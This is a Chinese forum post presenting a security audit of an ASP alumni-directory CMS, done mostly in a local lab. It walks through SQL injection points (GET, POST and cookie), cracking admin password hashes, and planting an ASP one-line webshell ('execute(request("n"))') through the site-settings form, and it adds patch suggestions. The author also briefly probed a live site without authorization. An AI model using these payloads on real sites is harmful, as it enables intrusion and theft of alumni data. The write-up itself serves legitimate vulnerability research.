@@ -1,0 +1,215 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+对某CMS(校友录)一次安全检测和漏洞分析[已发表,无图版]
+D8888D主贴内容-------------------------------------------------------
+无聊发发原创文章吧
+
+对某 CMS(校友录)一次安全检测和漏洞分析
+
+安天365.N3tl04D
+
+摘要：在互联网急速发展的今天，每个公司或团体都会建立自己的网站，但由于各种原因，大多时候使用网上发布的一些CMS来构建自己的网站，但却很少人会关注自己使用的CMS是否安全。如下面说检测到的校友录存在漏洞，当被攻击者攻破，校友的个人信息将被泄露。
+（一）对某CMS的初步安检1.初步查看某日，在安天365群里，KISS发过来一个网址，让我友情检测一下该网站的安全，于是打开此网站，如图1所示，感觉人情还不错，界面也比较简洁。
+
+
+图1 网站页面
+
+2.简单的安全测试打开网站一看原来是个校友录，随便找个带参数的地方，加个单引号，http://www.*********.com/gg.asp?id=100'，返回的结果如图2所示。
+
+
+图2 过滤单引号
+
+很明显，程序作了防注入的处理，看来程序开发者安全意识，还是做了一些安全措施，不过后来证明，防注入也只是检测了GET方法，并未对POST和COOKIE作检测。正准备测试cookie注入，这时 kiss传了个源代码过来，有源代码就好办了，还是在本地测试安全，网上的毕竟是未经授权的安全检测，多少存在一些风险。
+（二）在本地进行安全测试1.搭建测试环境把校友录的源代码复制到IIS的web目录下，打开浏览器浏览[url=http://192.168.1.5/txl/]链接标记http://192.168.1.5/txl/[/url]试试，结果如图3所示。
+
+
+图3 校友录不支持组件
+
+2.安装组件很显示，我本地服务器不支持它的组件，先看说明。在安装说明里有这么一句“组件安装方法，将该组件复制到C:\WINDOWS\system32里，并将此权限设置成允许网站访问组的完全控制权限。例：将 everyone设置成“完全控制”。然后在“开始/动行”中输入‘regsvr32 yvsy.dll’，卸载方式为‘regsvr32 yvsy.dll -u’”。照着它的方法注册了组件，如图4所示。
+
+
+图4 注册组件
+
+3.搭建试验环境成功
+注册成功后，再次浏览[url=http://192.168.1.5/txl/]链接标记http://192.168.1.5/txl/[/url]，如图5所示，一切正常了，后面开始检测该CMS的安全漏洞。
+
+
+图5 正常浏览
+
+（三）挖掘并查找安全漏洞1.解密CMS源代码使用Editplus编辑器打开CMS下的源代码，发现程序作者对部分源代码使用了Encoder加密，如图6所示。
+
+
+图6 部分加密代码
+
+2.解密源代码为了方便查看原代码，首先对它们进行解密，到网上下载下个 asp脚本解密工具，打开，选择源代码所以目录，如图7所示。
+
+
+图7 使用asp脚本解密工具对ASP脚本解密
+
+点击“开始解密”，几秒钟就可以对文件夹下所有 asp文件解密。解密后的代码如图8所示。
+
+
+图8 解密后的源代码
+
+说明：
+（1）其实，使用Encoder对asp脚本加密没什么必要，因为对于asp脚本解密太简单了，于其花时间在加密脚本上，不如将时间花在怎么写更安全的代码上。
+（2）什么是Encoder加密？
+Asp Encoder是微软想使ASP更好商业化而推出的一套算法，并推出了Script Encoder1.0。一个命令行的脚本加密工具。 Script Encoder的特点是：
+它只加密页面中嵌入的脚本代码，其他部分，如 HTML的TAG仍然保持原样不变。处理后的文件中被加密过的部分为只读内容，对加密部分的任何修改都将导致 整个加密后的文件不能使用。Script Encoder加密过的ASP文件还将使Script Debugger之类的脚本调试工具失效。
+3.查找SQL注入点因为代码还挺多的，不想一个个看，所以通过正则表达式来查找可能存在注入的文件，之后再慢慢看。打开EditPlus,点击“搜索”->“在文件中查找”，弹出的对话框，查找内容填写 “((select|update|delete)+.*(from|set)+.*(where)+.*)”，文件类型填写“*.asp”，文件夹选择校友录所在的文件夹，再把“包含了文件夹”和“正则表达式”选项选上，如图9所示。
+
+
+图9 使用正则查找可能注入文件
+
+此正则表达式的意思是查找文件夹下所有的asp 文件，如果包含select、update和delete这些SQL语句，就显示出来。只花了一秒钟，结果出来了，有68个文件使用到SQL语句，如图 10所示。
+
+图10 查询结果
+
+说明：
+在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要。正则表达式就是用于描述这些规则的工具。换句话说，正则表达式就是记录文本规则的代码。很可能你使用过Windows/Dos下用于文件查找的通配符 (wildcard)，也就是*和?。如果你想查找某个目录下的所有的Word文档的话，你会搜索*.doc。在这里，*会被解释成任意的字符串。和通配符类似，正则表达式也是用来进行文本匹配的工具，只不过比起通配符，它能更精确地描述你的需求——当然，代价就是更复杂——比如你可以编写一个正则表达式，用来查找所有以0开头，后面跟着2-3个数字，然后是一个连字号 “-”，最后是7或8位数字的字符串(像010-12345678或0376-7654321)。
+4.初审代码（1）查看app.asp文件源代码
+在查询结果中先查看app.asp文件，如图 11所示。
+
+
+图11 app.asp源代码
+
+第二行 bid=clng(request("bid"))把bid的值转为Long子类型，如果request的值不为数字，则会出现错误。如图12所示。 CLng 函数可返回表达式，此表达式已被转换为 Long 子类型的 Variant。
+
+
+图12 Clng出错
+
+注意：值的范围必须是在-2147483648 和 2147483647之间.
+（2）分析bbsadd.asp文件
+于是继续分析下一个文件，bbsadd.asp 文件，第406-409行：
+406  <%repquote=request("repquote")
+407  if repquote<>"" then
+408
+
+rs.open "select userid,cantent from [bbs] where id="&repquote&"",conn,1,1
+409
+
+reContent=obj.GetReContent(rs("cantent"))
+很明显，repquote参数未做任何过滤，直接放入SQL语句中，造成SQL注入。分析此文件得知，当引用别人的帖子回复时，触发此SQL注入。先浏览一下[url=http://192.168.1.4/txl/bbsadd.asp?aid=2&amp]链接标记http://192.168.1.4/txl/bbsadd.asp?aid=2&amp[/url];bid=3& amp;action=reply&repquote=2，返回正常，如图13所示。
+
+
+图13 引用回复正常
+
+再加个单引号[url=http://192.168.1.4/txl/bbsadd.asp?aid=2&amp]链接标记http://192.168.1.4/txl/bbsadd.asp?aid=2&amp[/url];bid=3& amp;action=reply&repquote=2'返回图2一样防注入的页面，我在源代码中一直找不到防注的代码，应该是存在它的组件中。看似没有办法注入了，但我们还有POST和COOKIE注入没有试，先试POST方法，直接把URL放到pangolin里，选择POST，在高级选项里读取cookie,点检测，一会，结果就出来了，如图14所示。
+
+
+图14 POST注入bbsadd
+
+pangolin别看它是英文界面，便它却是国人ZwelL写的一款Windows平台下的自动化SQL注入渗透测试工具。他实现了从检测到利用完成一体化的渗透攻击动作，尽可能的将SQL注入攻击效果最大化。
+（3）测试COOKIE注入
+再测试COOKIE注入，先依次在浏览器地址栏输入：
+[url=http://192.168.1.4/txl/bbsadd.asp?aid=2&bid=3&action=reply&repquote=2]链接标记http://192.168.1.4/txl/bbsadd.as ... eply&repquote=2[/url] 正常
+javascript:alert(document.cookie="repquote="+escape("2 and 1=1"));
+[url=http://192.168.1.4/txl/bbsadd.asp?aid=2&bid=3&action=reply]链接标记http://192.168.1.4/txl/bbsadd.as ... =3&action=reply[/url] 正常
+javascript:alert(document.cookie="repquote="+escape("2 and 1=2"));
+[url=http://192.168.1.4/txl/bbsadd.asp?aid=2&bid=3&action=reply]链接标记http://192.168.1.4/txl/bbsadd.as ... =3&action=reply[/url] 不正常,如图15所示。
+
+图15 COOKIE注入
+
+修补建议：把406行改为repquote =obj.regstr(request.form("repquote”))
+小知识：什么是POST注入和COOKIE注入？
+通常http请求不外乎 GET和POST两种方法，也就是说如果服务端要从客户端获取参数值的话，一般是使用Request.QueryString(“name”)或者Request.Form(“name”)方法，也可以合成Request(“name”)，一般防注入程序只是对这两种方法提交的值作了过滤，而忽视了另外一种方法，那就是Request.Cookie(“name”)，所以造成了COOKIE注入。
+（3）继续分析源代码
+继续一个个文件进行分析，其它文件没发现什么问题，一直来到登录文件login.asp。看28-35行
+28 if request("submi")=1 then
+29 if comeurl="" Then ShowError("请在页面里登录")
+30 xyluser=request.form("xyluser")
+31 xylpwd=md5(request.form("xylpwd"))
+32 if xyluser="" or xylpwd="" Then ShowError("用户名和密码不可以为空")
+33 rs.open "select id,password,lastdate,logins,lastip,sitejob,sitemoney,isclose from user where username='"&xyluser&"'",conn,1,3
+34
+If Rs.eof and Rs.bof Then ShowError("你的用户名不存在")
+35 if rs("password")<>xylpwd Then ShowError("你的密码错误")
+在第30行，xyluser变量未过虑，直接放入SQL语句中，造成注入。但却不能使用POST直接注入，看第29行，如果HTTPREFERER参数为空，就会提示“请在页面里登录”，直接提交
+[url=http://192.168.1.4/txl/login.asp?xylpwd=m3m3.com&CkiExp=31&submi=1&loginsubmit=%BB%E1%D4%B1%B5%C7%C2%BC&xyluser=n3tl04d]链接标记http://192.168.1.4/txl/login.asp ... amp;xyluser=n3tl04d[/url]。如图16所示显示错误。
+
+
+图16 REFERER为空出错
+
+虽然不能使用POST直接注入，但可以通过一个 php脚本来转发数据包来注入，中转脚本如下：
+dddddddddddddd
+ddddddddd
+把此脚本放在一个支持CRUL的PHP空间上，同时还要magic_quotes_gpc = off，如果magic_quotes_gpc = on,输入的单引号会被转义为“\'”，然后浏览[url=http://www.n3tl04d.mil/post4.php?id=n3tl04d]链接标记http://www.n3tl04d.mil/post4.php?id=n3tl04d[/url]，如图17所示。
+
+图 17php中转
+
+把[url=http://www.n3tl04d.mil/post4.php?id=n3tl04d]链接标记http://www.n3tl04d.mil/post4.php?id=n3tl04d[/url]放到Pangolin注入，如图18所示。
+
+
+图 18php中转注入
+
+
+修补建议：把第30行改为 xyluser =obj.regstr(request.form("xyluser”))
+（4）分析后台文件adminbj.asp文件
+分析后台文件adminbj.asp文件,先看代码
+10     <td> <%ad=request("ad")
+11 type2=request("type2")
+12 bjid=request("bjid")
+13 Select Case type2
+14
+
+Case "edit":
+……（略去无关代码）
+101 sub edit
+102
+sql="select * from bj where id="&bjid&""
+103 rs.open sql,conn,1,1%>
+很明显，未对传入参数bjid的值未做任何过滤，直接放入SQL语句中，[url=http://192.168.1.4/txl/admin/adminbj.asp?type2=edit&amp]链接标记http://192.168.1.4/txl/admin/adminbj.asp?type2=edit&amp[/url];bjid=1，又是一个注入，但只能POST或COOKIE注入，不过此此注入算是鸡肋的注入，因为要登录才能注入，没什么实际意义。同样的注入出现在后台多个文件了，这里就不一一写出来了。
+（四）后台拿shell1.猜解后台密码后台登录有两个密码，这两个密码都存在admin表中，所以猜解admin的表段时，需要手动添加password2第二个密码的表段，使用pangolin猜解，等一会，两个密码都猜出来了，如图19所示。
+
+图19 使用pangolin猜解管理员密码
+
+2.破解密码并登录后台把d42683b3df678c61和 c39059a89ab77d84拿到[url=http://www.cmd5.com]链接标记www.cmd5.com[/url]去解密，密码分别是admin1和admin2。拿去登录后台，成功。如图20所示。
+
+图20 成功登录校友录后台
+
+这里不太明白，为什么开发者使用两个登录密码，而两个密码放在同一表里，这里对安全性并没有太大的提高。应该把第二个密码使用其它加密方式单独写入一个asp文件中，这样安全性不是有更大的提高？
+3.插入一句话后门查看一下siteinfo.asp文件，此文件是网站的一些信息配置文件，而后台admin/siteinfo.asp对此配置文件编辑时，并不会对表单的值进行过滤，就给攻击者在配置文件写入一句话木马的机会。在管理后台,点击站点参数，在网址栏输入：http://"%><%execute(request("n"))%><%'，如图21所示。
+
+
+图21 写入一句话
+
+4.使用Lanker的Webshell连接后台
+使用lanker微型PHP+ASP管理器 1.0双用版连接[url=http://192.168.1.4/txl/siteinfo.asp]链接标记http://192.168.1.4/txl/siteinfo.asp[/url]，如图22所示，成功获得Webshell，之后可以上传大马，做进一步提权渗透测试。
+
+图22 成功连接一句话
+
+说明：
+此方法会造成网站无法正常浏览，在上传大马后，应及时恢复原配置文件siteinfo.asp。
+（五）直接拿webshell本来这是在最前面测试的，但由于各种原因，我把它放最后。数据库是以asp文件存在，如果使用者没更改默认数据库文件，那么就通过在可以输入的地方往数据库内插入一句话木马，直接得一个webshell了。于是查找所有文件中包含“request.form”的文件，最后在note.asp文件中发现，程序未对客户输入的内容做任何过滤，可以把一句话马直接插入数据库内。
+if request("type2")="add" then
+rs.open "select * from note1 where userid="&session("xyluserid")&"",conn,1,3
+
+If Rs.eof Then
+
+rs.addnew
+
+response.write "添加成功"
+
+rs("userid")=session("xyluserid")
+
+end if
+
+rs("content")=request.form("content")
+
+rs.update
+
+rs.close
+
+response.write "修改成功"
+end if
+于是尝试在往数据库中插入一句话，“%><%execute request("n")%><%”“%><%execute request("n")%>”等多种一句话的Unicode字符，再访问数据库文件，都显示，无法闭合，如图23所示。
+
+
+图23 数据库出错
+
+究原因是数据库中存在nodown表，做了防下载处理，不过应该可以突破，但本人能力有限，未能进一步突破。
+安全小知识：如何建立nodown防下载表？
+首先，用notepad新建一个内容为 <% 的文本文件，随便起个名字存档。
+接着，用Access打开您的数据库文件，在最后新建一个表，随便起个名字，在表中添加一个OLE对象的字段，然后添加一个记录，插入之前建立的文本文件，如果操作正确的话，应该可以看到一个新的名为 “数据包＂的记录。
+（六）总结由于本人不懂ASP，能力有限，所以此次检测并没太深入，还有一些XSS跨站攻击和上传等也未进行测试，总体来说，这套CMS的安全性还是可以的，如果管理员密码设置复杂一些，登录不了后台，那也无法拿到 webshell。个人认为在选择CMS时，建议选择一些成熟的CMS产品，那样安全性会高些，同时应该把数据库文件和配置文件的名称改复杂一些。
